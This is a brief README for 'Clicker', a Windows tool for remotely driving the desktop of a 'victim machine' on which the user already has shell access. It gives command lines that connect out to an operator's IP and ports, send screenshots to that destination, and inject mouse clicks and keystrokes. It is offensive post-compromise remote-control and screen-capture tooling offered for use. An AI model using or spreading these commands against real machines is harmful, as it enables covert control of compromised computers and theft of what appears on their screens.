# Clicker
It's a pseudo remote GUI operation tool for Windows.
You need shell access to use Clicker on the victim machine.

If you use ClickOperator, this command is needed
```
clicker.exe -b {dst IP address} {dst port for command} {dst port for data}
```

You can move mouse cursol and click (x and y are coordinates, left click=L, left double click=L2, right click=R)
```
clicker.exe -e {dst IP address} {dst port for data} "c:x,y,L"
```
Clicker get screen-shot and send it to specified destination.

Input text
```
clicker.exe -e 127.0.0.1 {port for data} "i:input this text !"
```
you can use KeyCode
https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.sendkeys.send?view=net-5.0



